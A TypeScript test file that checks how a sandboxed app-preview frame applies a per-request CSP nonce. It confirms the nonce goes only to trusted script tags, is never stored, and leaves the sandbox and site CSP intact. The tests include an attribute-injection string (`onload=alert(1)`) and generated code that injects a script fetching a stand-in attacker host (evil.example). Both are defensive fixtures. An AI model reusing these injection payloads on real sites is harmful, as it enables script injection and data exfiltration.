/**
 * The preview nonce: why it exists, and what it must never authorise.
 *
 *   npx tsx --conditions=react-server scripts/v2/preview-nonce.test.mts
 *
 * A `srcdoc` frame inherits the embedding page's CSP. Ventrio's pages allow
 * scripts only by nonce, so on staging the generated application loaded, its
 * stylesheet applied, and React never mounted — a styled, empty frame. The
 * fix is to put the request's own nonce on the three script tags Ventrio
 * itself writes, and on nothing else.
 *
 * Offline.
 */

import { readFileSync } from "node:fs";
import { buildSandboxDocument, SANDBOX_ATTRIBUTE, innerCsp } from "../../src/lib/v2/app/sandbox";
import { buildGeneratedApp } from "../../src/lib/v2/app/pipeline";
import { TIMELINE_APP } from "../../src/lib/v2/app/fixtures/timeline";
import { APP_STATE_VERSION, mergeAppState, readAppState, type AppProjectState } from "../../src/lib/v2/app/projectState";

let passed = 0;
const failures: string[] = [];
function check(name: string, ok: boolean, detail = ""): void {
  if (ok) { passed += 1; return; }
  failures.push(`${name}${detail ? ` — ${detail}` : ""}`);
}

const NONCE = "ZmNkN2FhZmItNWFhYi00NmZmLWFiYzItMTRlYmMzYTgwNWMy";
const base = {
  code: 'console.log("app");',
  css: ".a{color:red}",
  runtimeCore: "export const __libs = {};",
  runtimeNames: { react: ["useState"] },
  lang: "en",
  title: "Preview",
};

/* ── 1. the nonce reaches Ventrio's own scripts ──────────────────────────── */

{
  const doc = buildSandboxDocument({ ...base, nonce: NONCE, assets: { logo: "data:image/svg+xml,x" } });
  const tags = doc.match(/<script[^>]*>/g) ?? [];
  check("the document has script tags", tags.length >= 2, String(tags.length));
  check("every Ventrio script carries the nonce", tags.every(t => t.includes(`nonce="${NONCE}"`)), tags.join(" | "));
  check("the module bootstrap carries it", /<script type="module" nonce="/.test(doc));
  check("the shim carries it", /<script nonce="/.test(doc));

  const withoutAssets = buildSandboxDocument({ ...base, nonce: NONCE });
  check("a document with no assets still nonces its scripts",
    (withoutAssets.match(/<script[^>]*nonce=/g) ?? []).length === 2);
}

/* ── 2. omitted or malformed nonces are dropped, never interpolated ──────── */

{
  const none = buildSandboxDocument(base);
  check("no nonce attribute when none is supplied", !/nonce=/.test(none));

  for (const [name, bad] of [
    ["an attribute-injection attempt", '" onload="alert(1)'],
    ["a quote", 'abc"def'],
    ["a space", "abc def"],
    ["too short", "abc"],
    ["empty", ""],
  ] as Array<[string, string]>) {
    const doc = buildSandboxDocument({ ...base, nonce: bad });
    check(`rejected: ${name}`, !/nonce=/.test(doc) && !doc.includes("onload="), doc.slice(doc.indexOf("<script"), doc.indexOf("<script") + 60));
  }
}

/* ── 3. untrusted markup gains nothing ───────────────────────────────────── */

{
  // A generated app that emits its own <script> in its compiled output. The
  // escaping keeps it from closing Ventrio's tag, and it must never be handed
  // the nonce — under the inherited policy it simply does not run.
  const hostile = buildSandboxDocument({
    ...base,
    nonce: NONCE,
    code: 'document.body.innerHTML = "<script>fetch(\'https://evil.example\')</script>";',
  });
  // A `<script>` inside a JS string is not an element — the HTML parser inside
  // a script block looks only for `</script`, which the escaping neutralises.
  // What matters is that nothing but Ventrio's own tags carries the nonce.
  check("the generated string cannot close Ventrio's element", hostile.includes("<\\/script"));
  check("the nonce appears exactly as many times as Ventrio wrote it",
    (hostile.match(new RegExp(NONCE, "g")) ?? []).length === 2);
  const nonced = hostile.match(/<script[^>]*nonce=/g) ?? [];
  check("and only two tags are authorised", nonced.length === 2, String(nonced.length));
}

/* ── 4. nothing else about the sandbox moved ─────────────────────────────── */

{
  const doc = buildSandboxDocument({ ...base, nonce: NONCE });
  check("the sandbox attribute is unchanged", SANDBOX_ATTRIBUTE === "allow-scripts allow-forms");
  check("never allow-same-origin", !SANDBOX_ATTRIBUTE.includes("allow-same-origin"));
  check("the inner CSP is still emitted", doc.includes("Content-Security-Policy"));
  check("the inner CSP still denies network", /default-src 'none'|connect-src 'none'/.test(innerCsp()));

  const preview = readFileSync(new URL("../../src/components/workspace/AppPreview.tsx", import.meta.url), "utf8")
    .replace(/\/\*[\s\S]*?\*\//g, "").replace(/^\s*\/\/.*$/gm, "");
  check("the preview still uses the runtime's sandbox attribute", /sandbox=\{SANDBOX_ATTRIBUTE\}/.test(preview));
  check("and never allow-same-origin", !/allow-same-origin/.test(preview));

  const proxy = readFileSync(new URL("../../src/proxy.ts", import.meta.url), "utf8");
  check("the site CSP is not weakened with unsafe-inline for scripts",
    !/script-src[^;]*'unsafe-inline'/.test(proxy));
  check("and still uses a per-request nonce", /x-nonce/.test(proxy) && /randomUUID/.test(proxy));
}

/* ── 5. the nonce is never persisted ─────────────────────────────────────── */

{
  const state: AppProjectState = {
    version: APP_STATE_VERSION, kind: "app", app: TIMELINE_APP,
    generatedAt: "2026-08-11T10:00:00.000Z", model: "gemini-3.6-flash",
  };
  const snapshot = mergeAppState({}, state);
  const serialised = JSON.stringify(snapshot);
  check("the stored project contains no nonce", !serialised.includes(NONCE));
  check("and no nonce field at all", !/"nonce"/.test(serialised));

  const reloaded = readAppState(JSON.parse(serialised));
  check("nothing nonce-shaped survives a reload", !JSON.stringify(reloaded).includes("nonce"));

  const sandboxSrc = readFileSync(new URL("../../src/lib/v2/app/sandbox.ts", import.meta.url), "utf8");
  check("the nonce is an input to the document, not part of the contract",
    /nonce\?: string;/.test(sandboxSrc));
  const contract = readFileSync(new URL("../../src/lib/v2/app/contract.ts", import.meta.url), "utf8");
  check("GeneratedAppV1 has no nonce", !/nonce/i.test(contract));
  const projectState = readFileSync(new URL("../../src/lib/v2/app/projectState.ts", import.meta.url), "utf8");
  check("neither does the stored state", !/nonce/i.test(projectState));
}

/* ── 6. through the real build, and per-request ──────────────────────────── */

{
  const a = await buildGeneratedApp(TIMELINE_APP, { nonce: NONCE });
  check("a real build accepts the nonce", a.ok);
  if (a.ok) {
    check("and applies it to the compiled bootstrap", a.document.includes(`<script type="module" nonce="${NONCE}"`));
  }
  const second = "OTk5OTk5OTktOTk5OS05OTk5LTk5OTktOTk5OTk5OTk5OTk5";
  const b = await buildGeneratedApp(TIMELINE_APP, { nonce: second });
  check("a second request gets its own nonce", b.ok && b.document.includes(second) && !b.document.includes(NONCE));

  // Scoped to the script tags: the bundled React source mentions "nonce"
  // internally, so a document-wide search would always match.
  const none = await buildGeneratedApp(TIMELINE_APP);
  check("and a build without one authorises no tag",
    none.ok && (none.document.match(/<script[^>]*nonce=/g) ?? []).length === 0);

  const props = readFileSync(new URL("../../src/lib/build/workspaceProps.ts", import.meta.url), "utf8");
  check("the workspace reads the middleware's header", /headers\(\)\)\.get\("x-nonce"\)/.test(props));
  check("and does not mint its own", !/randomUUID|randomBytes/.test(props));
}

/* ── report ─────────────────────────────────────────────────────────────── */

if (failures.length > 0) {
  console.error(`FAILED ${failures.length} of ${passed + failures.length}`);
  for (const failure of failures) console.error(`  ✗ ${failure}`);
  process.exit(1);
}
console.log(`preview nonce: ${passed} checks passed`);
